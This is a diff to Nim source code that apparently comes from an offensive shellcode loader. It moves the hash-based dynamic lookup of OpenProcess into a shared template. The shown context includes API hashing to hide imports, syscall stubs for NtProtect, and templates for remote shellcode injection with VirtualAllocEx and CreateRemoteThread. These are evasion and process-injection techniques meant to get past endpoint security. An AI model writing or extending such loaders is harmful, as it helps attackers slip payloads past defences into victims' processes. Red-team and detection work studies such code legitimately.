@@ -33,7 +33,7 @@ MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_ad
 
 MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))
 
-
+MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
 """
 
 let DInvokeLoadLibraryAGetProcAddress * = """
@@ -204,7 +204,7 @@ var hProcess: HANDLE
 hProcess = MyGetCurrentProcess()
     
 let tProcess2 = MyGetCurrentProcessId()
-MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
 var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 var syscallStub_NtProtect: LPVOID
 
@@ -652,7 +652,7 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 let ShellcoderemoteinjectStub * = """
     
     let tProcess2 = MyGetCurrentProcessId()
-    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
     var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 
     MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
